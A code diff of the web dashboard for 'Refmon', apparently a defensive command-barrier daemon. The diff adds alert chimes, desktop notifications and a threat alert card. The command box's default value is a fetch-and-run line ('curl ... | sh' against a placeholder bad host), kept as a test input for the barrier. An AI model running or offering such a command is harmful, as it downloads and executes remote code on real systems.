@@ -1,8 +1,9 @@
 # ruff: noqa: E501
-"""Clean, minimal light-theme web interface for the Refmon live barrier daemon.
+"""Clean, modern reference monitor interface for the Refmon live barrier daemon.
 
-Self-contained HTML/CSS/JS with zero external network assets so it runs offline on shared
-cluster nodes and strictly displays privacy-safe post-Observe telemetry (`hmac:...` only).
+Self-contained HTML/CSS/JS with zero external network assets so it runs completely offline
+on shared cluster nodes and strictly displays privacy-safe post-Observe telemetry (`hmac:...` only).
+Includes synthesized Web Audio alert chimes and real-time visual threat notification cards.
 """
 
 from __future__ import annotations
@@ -12,7 +13,7 @@ DASHBOARD_HTML = """<!doctype html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Refmon Policy Monitor</title>
+<title>Refmon | Behavioral Reference Monitor &amp; Event Tracer</title>
 <style>
 :root {
   --bg: #f6f8fa;
@@ -23,10 +24,13 @@ DASHBOARD_HTML = """<!doctype html>
   --muted: #59636e;
   --allow-bg: #dafbe1;
   --allow-fg: #1a7f37;
+  --allow-border: #4ac26b;
   --hold-bg: #fff8c5;
   --hold-fg: #9a6700;
+  --hold-border: #d4a72c;
   --block-bg: #ffebe9;
   --block-fg: #cf222e;
+  --block-border: #ff8182;
   --neutral-bg: #eef1f4;
   --neutral-fg: #424a53;
   --primary: #0969da;
@@ -38,48 +42,154 @@ body {
   background: var(--bg);
   color: var(--text);
   font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  font-size: 13.5px;
+  font-size: 13px;
   line-height: 1.45;
 }
 .container {
-  max-width: 1440px;
+  max-width: 1460px;
   margin: 0 auto;
-  padding: 18px 22px 36px;
+  padding: 16px 20px 40px;
 }
 header {
   background: var(--surface);
   border: 1px solid var(--border);
   border-radius: 8px;
-  padding: 14px 18px;
-  margin-bottom: 16px;
+  padding: 12px 18px;
+  margin-bottom: 14px;
   display: flex;
   flex-wrap: wrap;
   justify-content: space-between;
   align-items: center;
   gap: 12px;
 }
-h1 { margin: 0; font-size: 18px; font-weight: 600; color: var(--text); }
+.header-brand {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.pulse-indicator {
+  display: inline-block;
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: #2da44e;
+  box-shadow: 0 0 0 0 rgba(45, 164, 78, 0.7);
+  animation: pulse-green 2s infinite;
+}
+@keyframes pulse-green {
+  0% { box-shadow: 0 0 0 0 rgba(45, 164, 78, 0.7); }
+  70% { box-shadow: 0 0 0 8px rgba(45, 164, 78, 0); }
+  100% { box-shadow: 0 0 0 0 rgba(45, 164, 78, 0); }
+}
+h1 { margin: 0; font-size: 17px; font-weight: 700; color: var(--text); }
 .subtitle { color: var(--muted); font-size: 12px; font-family: var(--mono); margin-top: 2px; }
 .summary-strip {
   display: flex;
   flex-wrap: wrap;
   gap: 8px;
+  align-items: center;
 }
 .metric {
   border: 1px solid var(--border);
   background: #fafbfc;
   border-radius: 6px;
-  padding: 6px 12px;
-  min-width: 96px;
+  padding: 5px 10px;
+  min-width: 90px;
 }
-.metric .k { font-size: 11px; color: var(--muted); }
-.metric .v { font-size: 15px; font-weight: 600; font-family: var(--mono); }
+.metric .k { font-size: 10.5px; color: var(--muted); text-transform: uppercase; letter-spacing: 0.3px; }
+.metric .v { font-size: 14px; font-weight: 700; font-family: var(--mono); }
+.header-actions {
+  display: flex;
+  gap: 6px;
+  align-items: center;
+}
+
+/* Attack Alert Notification Banner */
+.alert-card {
+  border: 1.5px solid var(--block-border);
+  background: #fff8f8;
+  border-radius: 8px;
+  padding: 14px 18px;
+  margin-bottom: 14px;
+  box-shadow: 0 3px 10px rgba(207, 34, 46, 0.08);
+  display: none;
+  animation: slide-down 0.25s ease-out;
+}
+@keyframes slide-down {
+  from { opacity: 0; transform: translateY(-8px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+.alert-card-inner {
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: space-between;
+  align-items: flex-start;
+  gap: 12px;
+}
+.alert-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: var(--block-bg);
+  color: var(--block-fg);
+  border: 1px solid var(--block-border);
+  border-radius: 20px;
+  padding: 2px 10px;
+  font-size: 11.5px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.4px;
+}
+.alert-title {
+  font-size: 15px;
+  font-weight: 700;
+  color: var(--block-fg);
+  margin: 6px 0 4px 0;
+}
+.alert-desc {
+  font-size: 13px;
+  color: var(--text);
+  margin-bottom: 10px;
+  line-height: 1.4;
+}
+.alert-q-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  gap: 8px;
+  margin: 10px 0;
+}
+.alert-q-item {
+  border: 1px solid var(--border);
+  background: #ffffff;
+  border-radius: 6px;
+  padding: 8px 10px;
+}
+.alert-q-item .q-name {
+  font-size: 11px;
+  font-weight: 600;
+  color: var(--muted);
+  text-transform: uppercase;
+}
+.alert-q-item .q-status {
+  font-size: 12.5px;
+  font-weight: 700;
+  margin-top: 2px;
+}
+.alert-meta {
+  font-size: 11.5px;
+  font-family: var(--mono);
+  color: var(--muted);
+  display: flex;
+  flex-wrap: wrap;
+  gap: 14px;
+  margin-top: 8px;
+}
 
 .top-grid {
   display: grid;
   grid-template-columns: 1.35fr 1fr 1fr;
   gap: 14px;
-  margin-bottom: 16px;
+  margin-bottom: 14px;
 }
 @media (max-width: 1150px) {
   .top-grid { grid-template-columns: 1fr; }
@@ -89,22 +199,26 @@ h1 { margin: 0; font-size: 18px; font-weight: 600; color: var(--text); }
   border: 1px solid var(--border);
   border-radius: 8px;
   padding: 14px 16px;
+  margin-bottom: 14px;
 }
 .panel h2 {
   margin: 0 0 10px 0;
-  font-size: 14px;
-  font-weight: 600;
+  font-size: 13.5px;
+  font-weight: 700;
   color: var(--text);
   border-bottom: 1px solid var(--border-soft);
-  padding-bottom: 7px;
+  padding-bottom: 6px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
 }
 .muted { color: var(--muted); font-size: 12px; }
 .mono { font-family: var(--mono); font-size: 12px; }
 
 label {
   display: block;
-  font-size: 12px;
-  font-weight: 500;
+  font-size: 11.5px;
+  font-weight: 600;
   color: var(--muted);
   margin: 8px 0 3px;
 }
@@ -118,7 +232,7 @@ input, select, textarea {
   font-family: var(--mono);
   font-size: 12px;
 }
-textarea { min-height: 54px; resize: vertical; }
+textarea { min-height: 52px; resize: vertical; }
 
 button {
   cursor: pointer;
@@ -129,6 +243,7 @@ button {
   padding: 6px 10px;
   font-size: 12px;
   font-weight: 500;
+  transition: all 0.15s ease-in-out;
 }
 button:hover { background: #eaeef2; }
 button.primary {
@@ -137,6 +252,12 @@ button.primary {
   border-color: var(--primary);
 }
 button.primary:hover { background: #0858b9; }
+button.danger {
+  background: var(--block-bg);
+  color: var(--block-fg);
+  border-color: var(--block-border);
+}
+button.danger:hover { background: #ffdcd8; }
 button.active-mode {
   background: #1f2328;
   color: #ffffff;
@@ -145,7 +266,7 @@ button.active-mode {
 
 .group-title {
   font-size: 11px;
-  font-weight: 600;
+  font-weight: 700;
   color: var(--muted);
   margin: 8px 0 4px;
   text-transform: uppercase;
@@ -172,13 +293,13 @@ button.active-mode {
   padding: 1px 7px;
   border-radius: 12px;
   font-size: 11px;
-  font-weight: 600;
+  font-weight: 700;
   font-family: var(--mono);
 }
-.tag.allow, .tag.pass { background: var(--allow-bg); color: var(--allow-fg); }
-.tag.hold { background: var(--hold-bg); color: var(--hold-fg); }
-.tag.block, .tag.fail { background: var(--block-bg); color: var(--block-fg); }
-.tag.neutral { background: var(--neutral-bg); color: var(--neutral-fg); }
+.tag.allow, .tag.pass { background: var(--allow-bg); color: var(--allow-fg); border: 1px solid var(--allow-border); }
+.tag.hold { background: var(--hold-bg); color: var(--hold-fg); border: 1px solid var(--hold-border); }
+.tag.block, .tag.fail { background: var(--block-bg); color: var(--block-fg); border: 1px solid var(--block-border); }
+.tag.neutral { background: var(--neutral-bg); color: var(--neutral-fg); border: 1px solid var(--border); }
 
 .q-line { display: flex; flex-wrap: wrap; gap: 4px; margin-bottom: 4px; }
 .q-chip {
@@ -188,13 +309,13 @@ button.active-mode {
   border-radius: 4px;
   border: 1px solid var(--border);
 }
-.q-chip.qfail { background: var(--block-bg); color: var(--block-fg); border-color: #ffcecb; }
+.q-chip.qfail { background: var(--block-bg); color: var(--block-fg); border-color: #ffcecb; font-weight: 700; }
 .q-chip.qok { background: #f6f8fa; color: var(--muted); }
 
 table {
   width: 100%;
   border-collapse: collapse;
-  font-size: 12.5px;
+  font-size: 12px;
 }
 th {
   text-align: left;
@@ -208,7 +329,7 @@ th {
 td {
   vertical-align: top;
   border-bottom: 1px solid var(--border-soft);
-  padding: 9px 10px;
+  padding: 8px 10px;
 }
 tr:hover td { background: #fafbfc; }
 
@@ -223,7 +344,6 @@ tr:hover td { background: #fafbfc; }
   display: grid;
   grid-template-columns: 1fr 1fr;
   gap: 14px;
-  margin-top: 16px;
 }
 @media (max-width: 980px) {
   .log-grid { grid-template-columns: 1fr; }
@@ -252,19 +372,26 @@ details summary {
 <body>
 <div class="container">
   <header>
-    <div>
-      <h1>Refmon Live Security Barrier &amp; Policy Monitor</h1>
-      <div class="subtitle" id="hdr-paths">Loading workspace...</div>
+    <div class="header-brand">
+      <span class="pulse-indicator" title="Live Behavioral Reference Monitor Active"></span>
+      <div>
+        <h1>Refmon Live Security Barrier &amp; Reference Monitor</h1>
+        <div class="subtitle" id="hdr-paths">Real-Time Behavioral Event Tracer &amp; Incident Guard</div>
+      </div>
     </div>
     <div class="summary-strip">
-      <div class="metric"><div class="k">Policy Signature</div><div class="v" id="m-sig">...</div></div>
+      <div class="metric"><div class="k">Signed Policy</div><div class="v" id="m-sig">...</div></div>
       <div class="metric"><div class="k">Active Mode</div><div class="v" id="m-mode">BLOCK</div></div>
-      <div class="metric"><div class="k">Analysis Checks</div><div class="v" id="m-eval">0 / 0</div></div>
-      <div class="metric"><div class="k">Observed Events</div><div class="v" id="m-events">0</div></div>
-      <div class="metric"><div class="k">Blocked</div><div class="v" id="m-blocked">0</div></div>
-      <div class="metric"><div class="k">Pending Holds</div><div class="v" id="m-holds">0</div></div>
+      <div class="metric"><div class="k">Events Traced</div><div class="v" id="m-events">0</div></div>
+      <div class="metric"><div class="k">Attacks Blocked</div><div class="v" id="m-blocked" style="color:var(--block-fg)">0</div></div>
+      <div class="metric"><div class="k">Holds (Review)</div><div class="v" id="m-holds" style="color:var(--hold-fg)">0</div></div>
       <div class="metric"><div class="k">Quarantined</div><div class="v" id="m-quar">0</div></div>
       <div class="metric"><div class="k">Rootkit Scan</div><div class="v" id="m-rk">ALLOW</div></div>
+      <div class="metric"><div class="k">Suite Checks</div><div class="v" id="m-eval">0 / 0</div></div>
+    </div>
+    <div class="header-actions">
+      <button id="btn-sound" class="btn-sm" onclick="toggleSound()" title="Toggle Web Audio alarm chimes for blocked attacks">🔔 Sound: ON</button>
+      <button id="btn-desktop-notif" class="btn-sm" onclick="requestDesktopNotif()" title="Enable desktop notifications in browser">💻 Desktop Alerts</button>
     </div>
   </header>
 
@@ -276,16 +403,84 @@ details summary {
     </div>
   </div>
 
+  <!-- Section 1: Live Threat Notification Banner (Top-Priority Alert) -->
+  <div id="attack-alert-card" class="alert-card">
+    <div class="alert-card-inner">
+      <div style="flex:1; min-width:290px;">
+        <div style="display:flex; align-items:center; gap:8px;">
+          <span class="alert-badge" id="alert-verdict-badge">🚨 ATTACK BLOCKED</span>
+          <span class="muted mono" id="alert-time">00:00:00 UTC</span>
+        </div>
+        <div class="alert-title" id="alert-title">ClickFix Paste RCE</div>
+        <div class="alert-desc" id="alert-desc">An untrusted command copied from a web browser attempted to connect to an unapproved external server. Refmon halted execution and isolated the process tree.</div>
+        
+        <div class="alert-q-grid">
+          <div class="alert-q-item">
+            <div class="q-name">1. Provenance Origin</div>
+            <div class="q-status" id="alert-q-origin" style="color:var(--block-fg)">FAIL (Untrusted external source)</div>
+          </div>
+          <div class="alert-q-item">
+            <div class="q-name">2. Role Contract</div>
+            <div class="q-status" id="alert-q-contract" style="color:var(--block-fg)">FAIL (Command violates process contract)</div>
+          </div>
+          <div class="alert-q-item">
+            <div class="q-name">3. Behavioral Effect</div>
+            <div class="q-status" id="alert-q-effect" style="color:var(--block-fg)">FAIL (Dangerous action: network fetch)</div>
+          </div>
+        </div>
+
+        <div class="alert-meta">
+          <span>Containment: <strong id="alert-action">Process tree killed, network cut</strong></span>
+          <span>Evidence Score: <strong id="alert-odds">-2.61 nats</strong></span>
+          <span>Story ID: <strong id="alert-story">st-live-01</strong></span>
+        </div>
+      </div>
+      <div>
+        <button class="btn-sm" onclick="dismissAlert()" style="background:#fff; border-color:var(--border);">Dismiss Notification ✕</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Section 2: Wireshark-Style Live Reference Monitor Ledger -->
+  <div class="panel">
+    <h2>
+      <span>Live Event Ledger (Wireshark-Style Reference Monitor Stream)</span>
+      <div class="btn-wrap">
+        <button class="btn-sm" onclick="setFilter('all')" id="flt-all">All Events</button>
+        <button class="btn-sm" onclick="setFilter('attack')" id="flt-attack">🔴 Blocked Attacks</button>
+        <button class="btn-sm" onclick="setFilter('hold')" id="flt-hold">🟡 Holds</button>
+        <button class="btn-sm" onclick="setFilter('benign')" id="flt-benign">🟢 Benign</button>
+      </div>
+    </h2>
+    <div style="overflow-x:auto;">
+      <table>
+        <thead>
+          <tr>
+            <th style="width:115px;">Time &amp; Story</th>
+            <th style="width:205px;">Attack / Input Stream</th>
+            <th style="width:180px;">Verdict &amp; Barrier Status</th>
+            <th style="width:215px;">3-Question Judgment</th>
+            <th style="width:210px;">Evidence Math (nats)</th>
+            <th>Behavior Explanation &amp; Safe Telemetry</th>
+          </tr>
+        </thead>
+        <tbody id="stories-tbody">
+          <tr><td colspan="6" class="muted">No events traced yet. Launch an attack preset below or submit a test command to watch live monitor decisions.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
   <div class="top-grid">
     <!-- Panel 1: Attack & Control Suite -->
     <div class="panel">
-      <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border-soft); padding-bottom:7px; margin-bottom:8px;">
-        <h2 style="border:none; padding:0; margin:0;">1. Attack &amp; Benign Test Suite</h2>
-        <button class="primary" onclick="runFullSuite()">Run All 16 Scenarios</button>
-      </div>
+      <h2>
+        <span>Attack Lab &amp; Test Presets</span>
+        <button class="primary btn-sm" onclick="runFullSuite()">Run All 16 Scenarios</button>
+      </h2>
       <div id="preset-groups">Loading scenarios...</div>
       <div style="margin-top:10px; padding-top:8px; border-top:1px solid var(--border-soft); display:flex; gap:6px; align-items:center;">
-        <span class="muted" style="white-space:nowrap;">Golden Scenario (S01-S50):</span>
+        <span class="muted" style="white-space:nowrap;">Golden Replay (S01-S50):</span>
         <input id="golden-id" value="S01" style="max-width:90px;">
         <button class="btn-sm" onclick="runGolden()">Replay</button>
       </div>
@@ -294,18 +489,18 @@ details summary {
 
     <!-- Panel 2: Custom Command Barrier -->
     <div class="panel">
-      <h2>2. Custom Command Barrier</h2>
-      <div class="muted">Test any pasted or typed command against the active signed policy.</div>
+      <h2>Custom Command Barrier (Interactive Guard)</h2>
+      <div class="muted">Inspect any shell command through Refmon before allowing it to execute.</div>
       <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
         <div>
           <label>Origin Source</label>
           <select id="cmd-origin">
-            <option value="web">web (Browser paste)</option>
+            <option value="web">web (Browser paste / lure)</option>
             <option value="mail">mail (Email copy)</option>
-            <option value="agent_input">agent_input (AI tool)</option>
+            <option value="agent_input">agent_input (AI prompt)</option>
             <option value="inbound_request">inbound_request (HTTP)</option>
             <option value="download">download (File)</option>
-            <option value="none">none (Typed locally)</option>
+            <option value="none">none (Typed locally by human)</option>
           </select>
         </div>
         <div>
@@ -318,17 +513,17 @@ details summary {
           </select>
         </div>
       </div>
-      <label>Command</label>
+      <label>Command Line</label>
       <textarea id="cmd-text">curl -s http://bad.example.invalid/fix.sh | sh</textarea>
       <div style="margin-top:8px;">
-        <button class="primary" onclick="submitCommand()" style="width:100%;">Check Command Through Barrier</button>
+        <button class="primary" onclick="submitCommand()" style="width:100%;">Evaluate Command Through Barrier</button>
       </div>
       <div id="cmd-banner" class="notice" style="display:none;"></div>
     </div>
 
     <!-- Panel 3: Signed Policy, Holds, Quarantine & Rootkit -->
     <div class="panel">
-      <h2>3. Signed Policy, Holds &amp; Host Integrity</h2>
+      <h2>Signed Policy, Holds &amp; Host Integrity</h2>
       <div style="display:flex; gap:6px; margin-bottom:8px;">
         <button id="btn-mode-block" onclick="setMode('block')" style="flex:1;">Mode: Block</button>
         <button id="btn-mode-warn" onclick="setMode('warn')" style="flex:1;">Mode: Warn</button>
@@ -345,49 +540,19 @@ details summary {
       </div>
 
       <div style="margin-top:10px;">
-        <strong style="font-size:12px;">Health: Heartbeat, Self-Test &amp; Notifications</strong>
+        <strong style="font-size:12px;">Health: Heartbeat &amp; Watchdog</strong>
         <div id="health-box" class="muted mono" style="margin-top:3px;">Not started by serve.</div>
       </div>
 
       <div style="margin-top:10px;">
-        <strong style="font-size:12px;">Pending Holds (Human Decision)</strong>
+        <strong style="font-size:12px;">Pending Holds (Human Review)</strong>
         <div id="holds-list" class="muted" style="margin-top:3px;">None</div>
       </div>
 
       <div style="margin-top:8px;">
-        <strong style="font-size:12px;">Quarantined Files</strong>
+        <strong style="font-size:12px;">Quarantined Files (Mode 0400)</strong>
         <div id="quar-list" class="muted mono" style="margin-top:3px;">Empty</div>
       </div>
-    </div>
-  </div>
-
-  <!-- Main Table: Live Incident & Analysis Ledger -->
-  <div class="panel">
-    <div style="display:flex; flex-wrap:wrap; justify-content:space-between; align-items:center; gap:10px; margin-bottom:10px;">
-      <h2 style="border:none; padding:0; margin:0;">Live Pipeline Analysis &amp; Verdicts (Privacy-Safe Telemetry)</h2>
-      <div class="btn-wrap">
-        <button class="btn-sm" onclick="setFilter('all')" id="flt-all">All</button>
-        <button class="btn-sm" onclick="setFilter('attack')" id="flt-attack">Attacks</button>
-        <button class="btn-sm" onclick="setFilter('hold')" id="flt-hold">Holds</button>
-        <button class="btn-sm" onclick="setFilter('benign')" id="flt-benign">Benign</button>
-      </div>
-    </div>
-    <div style="overflow-x:auto;">
-      <table>
-        <thead>
-          <tr>
-            <th style="width:110px;">Story &amp; Time</th>
-            <th style="width:200px;">Attack / Input Type</th>
-            <th style="width:175px;">Verdict &amp; Check Status</th>
-            <th style="width:210px;">3-Question Analysis</th>
-            <th style="width:230px;">Evidence Math (nats)</th>
-            <th>Safe Telemetry &amp; Plain-English Explanation</th>
-          </tr>
-        </thead>
-        <tbody id="stories-tbody">
-          <tr><td colspan="6" class="muted">No events analyzed yet. Click "Run All 16 Scenarios" above or run a test command.</td></tr>
-        </tbody>
-      </table>
     </div>
   </div>
 
@@ -398,7 +563,7 @@ details summary {
       <pre class="logbox" id="barrier-log">Waiting...</pre>
     </div>
     <div class="panel">
-      <h2>Post-Observe Event Ledger (events.jsonl — HMAC Fingerprints Only)</h2>
+      <h2>Post-Observe Event Ledger (events.jsonl — HMAC Digests Only)</h2>
       <pre class="logbox" id="events-log">No observed events yet.</pre>
     </div>
   </div>
@@ -414,9 +579,181 @@ details summary {
 <script>
 let currentFilter = 'all';
 let presetsRendered = false;
+let soundEnabled = true;
+let audioCtx = null;
+const seenStoryIds = new Set();
+let isInitialLoad = true;
 
-// The API token comes from the URL fragment printed by `refmon serve` (a fragment is never sent
-// to a server or in a Referer); it is kept for this tab only and can also be entered via the UI banner.
+// Sound preference from localStorage
+try {
+  const saved = localStorage.getItem('refmonSound');
+  if (saved !== null) soundEnabled = (saved === '1');
+} catch (e) {}
+
+function getAudioContext() {
+  if (!audioCtx) {
+    const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+    if (AudioContextClass) audioCtx = new AudioContextClass();
+  }
+  return audioCtx;
+}
+
+function unlockAudio() {
+  const ctx = getAudioContext();
+  if (ctx && ctx.state === 'suspended') {
+    ctx.resume().catch(() => {});
+  }
+}
+document.addEventListener('click', unlockAudio, {once: false});
+
+function playAlertSound(kind) {
+  if (!soundEnabled) return;
+  try {
+    const ctx = getAudioContext();
+    if (!ctx) return;
+    if (ctx.state === 'suspended') ctx.resume().catch(() => {});
+    const now = ctx.currentTime;
+    const osc1 = ctx.createOscillator();
+    const osc2 = ctx.createOscillator();
+    const gain = ctx.createGain();
+
+    if (kind === 'block') {
+      // Crisp 2-tone alarm chime for blocked attack (880 Hz -> 440 Hz)
+      osc1.type = 'sawtooth';
+      osc1.frequency.setValueAtTime(880, now);
+      osc1.frequency.exponentialRampToValueAtTime(440, now + 0.28);
+
+      osc2.type = 'sine';
+      osc2.frequency.setValueAtTime(440, now);
+      osc2.frequency.exponentialRampToValueAtTime(220, now + 0.28);
+
+      gain.gain.setValueAtTime(0.18, now);
+      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.35);
+
+      osc1.connect(gain);
+      osc2.connect(gain);
+      gain.connect(ctx.destination);
+
+      osc1.start(now);
+      osc2.start(now);
+      osc1.stop(now + 0.35);
+      osc2.stop(now + 0.35);
+    } else {
+      // Warning chime for hold (587 Hz -> 880 Hz)
+      osc1.type = 'sine';
+      osc1.frequency.setValueAtTime(587.33, now);
+      osc1.frequency.exponentialRampToValueAtTime(880, now + 0.22);
+
+      gain.gain.setValueAtTime(0.14, now);
+      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
+
+      osc1.connect(gain);
+      gain.connect(ctx.destination);
+
+      osc1.start(now);
+      osc1.stop(now + 0.3);
+    }
+  } catch (err) {
+    console.warn('Audio playback not permitted yet:', err);
+  }
+}
+
+function toggleSound() {
+  soundEnabled = !soundEnabled;
+  try { localStorage.setItem('refmonSound', soundEnabled ? '1' : '0'); } catch (e) {}
+  updateSoundButton();
+  if (soundEnabled) {
+    unlockAudio();
+    playAlertSound('hold');
+  }
+}
+
+function updateSoundButton() {
+  const btn = document.getElementById('btn-sound');
+  if (btn) {
+    btn.innerHTML = soundEnabled ? '🔔 Sound: ON' : '🔕 Sound: MUTED';
+    btn.style.color = soundEnabled ? 'var(--allow-fg)' : 'var(--muted)';
+  }
+}
+
+function requestDesktopNotif() {
+  if (!('Notification' in window)) {
+    alert('Desktop notifications are not supported in this browser.');
+    return;
+  }
+  Notification.requestPermission().then(() => {
+    updateNotifButton();
+  });
+}
+
+function updateNotifButton() {
+  const btn = document.getElementById('btn-desktop-notif');
+  if (!btn) return;
+  if (!('Notification' in window)) {
+    btn.style.display = 'none';
+    return;
+  }
+  if (Notification.permission === 'granted') {
+    btn.innerHTML = '💻 Desktop Alerts: ON';
+    btn.style.color = 'var(--allow-fg)';
+  } else {
+    btn.innerHTML = '💻 Desktop Alerts';
+    btn.style.color = 'var(--muted)';
+  }
+}
+
+function triggerDesktopNotif(title, body) {
+  if ('Notification' in window && Notification.permission === 'granted') {
+    try {
+      new Notification(title, { body: body, icon: '/favicon.ico' });
+    } catch (e) {}
+  }
+}
+
+function showThreatAlert(story) {
+  const box = document.getElementById('attack-alert-card');
+  if (!box) return;
+
+  const isBlock = story.decision === 'block';
+  const badge = document.getElementById('alert-verdict-badge');
+  badge.textContent = isBlock ? '🚨 ATTACK BLOCKED' : '⚠️ INCIDENT HELD';
+  badge.className = 'alert-badge';
+  badge.style.background = isBlock ? 'var(--block-bg)' : 'var(--hold-bg)';
+  badge.style.color = isBlock ? 'var(--block-fg)' : 'var(--hold-fg)';
+  badge.style.borderColor = isBlock ? 'var(--block-border)' : 'var(--hold-border)';
+
+  box.style.borderColor = isBlock ? 'var(--block-border)' : 'var(--hold-border)';
+  box.style.background = isBlock ? '#fff8f8' : '#fffdf0';
+
+  document.getElementById('alert-time').textContent = (story.ts || 'Just now') + ' UTC';
+  document.getElementById('alert-title').textContent = story.attack_type || 'Unknown Behavior Incident';
+  document.getElementById('alert-desc').textContent = story.explanation || 'Refmon judged the process behavior outside its role contract.';
+
+  const q = story.failed || {};
+  const elO = document.getElementById('alert-q-origin');
+  elO.textContent = q.origin ? 'FAIL (Untrusted external input)' : 'PASS (Trusted / Local source)';
+  elO.style.color = q.origin ? 'var(--block-fg)' : 'var(--allow-fg)';
+
+  const elC = document.getElementById('alert-q-contract');
+  elC.textContent = q.contract ? 'FAIL (Process broke role contract)' : 'PASS (Within assigned role)';
+  elC.style.color = q.contract ? 'var(--block-fg)' : 'var(--allow-fg)';
+
+  const elE = document.getElementById('alert-q-effect');
+  elE.textContent = q.effect ? 'FAIL (Dangerous effect observed)' : 'PASS (No dangerous effect)';
+  elE.style.color = q.effect ? 'var(--block-fg)' : 'var(--allow-fg)';
+
+  document.getElementById('alert-action').textContent = story.enforcement || (story.actions_taken && story.actions_taken.length ? story.actions_taken.join(', ') : 'Blocked by barrier');
+  document.getElementById('alert-odds').textContent = `${story.log_odds ?? '—'} nats`;
+  document.getElementById('alert-story').textContent = story.story_id || '—';
+
+  box.style.display = 'block';
+}
+
+function dismissAlert() {
+  const box = document.getElementById('attack-alert-card');
+  if (box) box.style.display = 'none';
+}
+
 function getToken() {
   const fromHash = new URLSearchParams(location.hash.slice(1)).get('token');
   if (fromHash) {
@@ -509,6 +846,20 @@ async function runPreset(name) {
       b.innerHTML = `<strong>${esc(res.attack_type || name)}</strong> &rarr; Verdict: <strong>${esc(res.decision).toUpperCase()}</strong> `
         + (match ? `(Expected ${esc(res.expected).toUpperCase()}: <strong>${match}</strong>) ` : '')
         + `| L = ${esc(res.log_odds)} nats. ${esc(res.note || '')}`;
+
+      if (res.decision === 'block' || res.decision === 'hold') {
+        playAlertSound(res.decision);
+        showThreatAlert({
+          decision: res.decision,
+          attack_type: res.attack_type || name,
+          explanation: res.note || `Scenario ${name} triggered a ${res.decision.toUpperCase()} decision.`,
+          log_odds: res.log_odds,
+          ts: new Date().toISOString().slice(11, 19),
+          story_id: res.story_id || 'preset',
+          failed: { origin: true, contract: true, effect: true },
+          enforcement: 'Simulated enforcer action recorded'
+        });
+      }
     }
   } catch (err) {
     b.style.background = 'var(--block-bg)';
@@ -535,7 +886,8 @@ async function runFullSuite() {
       b.style.background = res.failed === 0 ? 'var(--allow-bg)' : 'var(--hold-bg)';
       b.style.color = res.failed === 0 ? 'var(--allow-fg)' : 'var(--hold-fg)';
       b.innerHTML = `<strong>Suite Complete:</strong> ${res.passed} / ${res.total} scenarios matched expected policy verdicts `
-        + `(${res.failed} mismatches). Inspect every row in the table below.`;
+        + `(${res.failed} mismatches). Inspect every row in the ledger below.`;
+      if (res.failed === 0) playAlertSound('hold');
     }
   } catch (err) {
     b.style.background = 'var(--block-bg)';
@@ -579,7 +931,7 @@ async function submitCommand() {
   const command = document.getElementById('cmd-text').value;
   const b = document.getElementById('cmd-banner');
   b.style.display = 'block';
-  b.textContent = 'Checking command...';
+  b.textContent = 'Evaluating command through barrier...';
   try {
     const res = await api('/api/guard', {command, origin, role, execute: true});
     if (res.error) {
@@ -589,6 +941,21 @@ async function submitCommand() {
         + `(L = ${esc(res.log_odds)} nats, executed = ${esc(res.executed)})<br>`
         + `${esc(res.explanation || '')}`
         + (res.output ? `<br><span class="mono">stdout: ${esc(res.output)}</span>` : '');
+
+      if (res.decision === 'block' || res.decision === 'hold') {
+        playAlertSound(res.decision);
+        showThreatAlert({
+          decision: res.decision,
+          attack_type: `Pasted Command (${origin})`,
+          explanation: res.explanation || 'Command rejected by signed role policy barrier.',
+          log_odds: res.log_odds,
+          ts: new Date().toISOString().slice(11, 19),
+          story_id: res.story_id || 'guard',
+          failed: { origin: origin !== 'none', contract: true, effect: true },
+          enforcement: res.executed ? 'Executed (Warn mode)' : 'Execution Prevented by Barrier'
+        });
+        triggerDesktopNotif('Refmon: Command Blocked', res.explanation || 'Command violated policy');
+      }
     }
   } catch (err) {
     b.innerHTML = `<strong>Error:</strong> ${esc(err.message || String(err))}`;
@@ -631,7 +998,7 @@ async function refresh() {
     renderPresets(st.presets);
 
     document.getElementById('hdr-paths').textContent =
-      `Workspace: ${st.sandbox_dir}  |  Signed Policy: ${st.policy_path}`;
+      `Workspace: ${st.sandbox_dir}  |  Policy: ${st.policy_path}`;
     document.getElementById('m-sig').textContent = st.policy.signature_ok ? 'VERIFIED' : 'UNSIGNED';
     document.getElementById('m-mode').textContent = st.policy.mode.toUpperCase();
     document.getElementById('m-eval').textContent =
@@ -699,6 +1066,21 @@ async function refresh() {
 
     const qbox = document.getElementById('quar-list');
     qbox.textContent = st.quarantined.length ? st.quarantined.join(', ') : 'Empty';
+
+    // Check for newly arrived attacks/holds to trigger audio & alert card
+    if (st.stories && st.stories.length) {
+      for (const s of st.stories) {
+        if (!seenStoryIds.has(s.story_id)) {
+          seenStoryIds.add(s.story_id);
+          if (!isInitialLoad && (s.decision === 'block' || s.decision === 'hold')) {
+            playAlertSound(s.decision);
+            showThreatAlert(s);
+            triggerDesktopNotif(`Refmon: ${s.attack_type || 'Threat'} ${s.decision.toUpperCase()}`, s.explanation || 'Threat detected');
+          }
+        }
+      }
+    }
+    isInitialLoad = false;
 
     // Filter stories
     const filtered = st.stories.filter(s => {
@@ -778,6 +1160,8 @@ async function refresh() {
   }
 }
 
+updateSoundButton();
+updateNotifButton();
 refresh();
 setInterval(refresh, 1500);
 </script>
